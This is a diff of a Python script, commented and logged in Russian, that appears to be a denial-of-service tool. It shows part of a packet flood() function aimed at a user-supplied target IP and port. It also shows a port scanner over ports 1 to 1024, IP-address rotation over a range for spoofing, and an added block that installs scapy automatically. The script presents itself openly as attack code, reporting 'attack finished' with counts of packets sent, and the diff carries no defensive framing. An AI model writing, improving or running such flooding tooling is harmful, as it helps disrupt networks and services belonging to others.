@@ -1,11 +1,24 @@
+import subprocess
+import sys
+
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+required_packages = ["scapy", "ipaddress"]
+
+for package in required_packages:
+    try:
+        __import__(package)
+    except ImportError:
+        print(f"Installing {package}...")
+        install(package)
+
 import random
 import socket
 import threading
 import time
-import sys
-from scapy.all import *
 import logging
-import ipaddress
+from scapy.all import *
 
 # Настройка логгирования
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -29,12 +42,11 @@ def flood(target_ip, target_port, duration, mtu=1500):
         except socket.error as e:
             packets_failed += 1
             logging.warning(f"Ошибка при отправке пакета: {e}")
-        time.sleep(0.01)  # Небольшая задержка, чтобы избежать полной загрузки CPU
+        time.sleep(0.01)
 
     logging.info(f"Атака завершена. Отправлено пакетов: {packets_sent}, не отправлено: {packets_failed}")
 
 def port_scan(ip_address):
-    """Сканирует открытые порты на указанном IP."""
     open_ports = []
     for port in range(1, 1025):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -46,7 +58,6 @@ def port_scan(ip_address):
     return open_ports
 
 def ip_rotation(ip_range, num_ips):
-    """Возвращает список IP-адресов для ротации."""
     network = ipaddress.ip_network(ip_range)
     return list(network.hosts())[:num_ips]
 
@@ -72,7 +83,6 @@ def main():
     num_threads = int(input("Введите количество потоков: "))
     mtu = int(input("Введите MTU (1500 по умолчанию): ") or 1500)
     
-    # Ротация IP
     ip_range = input("Введите диапазон IP для ротации (например, 192.168.1.0/24): ")
     num_ips = int(input("Введите количество IP-адресов для ротации: "))
     rotated_ips = ip_rotation(ip_range, num_ips)
